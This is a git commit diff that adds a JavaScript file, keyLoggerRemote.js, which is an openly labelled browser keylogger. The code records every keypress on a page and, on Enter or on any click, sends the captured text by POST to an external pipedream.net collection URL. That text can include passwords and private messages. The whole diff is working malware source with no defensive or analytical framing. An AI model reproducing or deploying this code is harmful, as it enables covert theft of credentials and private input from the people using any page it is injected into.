a68bdc814d3ca835ff3af0fe2db6711644f66914
Ashraful Hoda <141621146+ashrafulHodaJs@users.noreply.github.com>
2024-04-06 20:50:57 +0530

    Update keyLoggerRemote.js

--- keyLoggerRemote.js
+++ keyLoggerRemote.js
@@ -1,4 +1,34 @@
-const str = keyStrokeString;
+let keyStrokeString = '';
+
+function handleKeypress(event) {
+    if (event.key !== 'Enter') {
+        keyStrokeString += event.key;
+    } else {
+       const str = keyStrokeString;
+
+fetch('https://eofyfyh52mz68hy.m.pipedream.net', { //pipedream unique url i am using to post keyLoggerStrings
+    method: 'POST',
+    body: JSON.stringify({ message: str }),
+    headers: {
+        'Content-Type': 'application/json'
+    }
+}).then(response => {
+    if (response.ok) {
+        console.log('String sent successfully:', str);
+    } else {
+        console.error('Failed to send string:', response.status);
+    }
+}).catch(error => {
+    console.error('Error sending string:', error);
+});
+
+        // Reset the keyStrokeString for the next sequence
+        keyStrokeString = '';
+    }
+}
+
+function handleClick(event) {
+   const str = keyStrokeString;
 
 fetch('https://eofyfyh52mz68hy.m.pipedream.net', {
     method: 'POST',
@@ -15,3 +45,11 @@ fetch('https://eofyfyh52mz68hy.m.pipedream.net', {
 }).catch(error => {
     console.error('Error sending string:', error);
 });
+
+    keyStrokeString = '';
+}
+
+document.addEventListener('keypress', handleKeypress);
+document.addEventListener('click', handleClick);
+
+
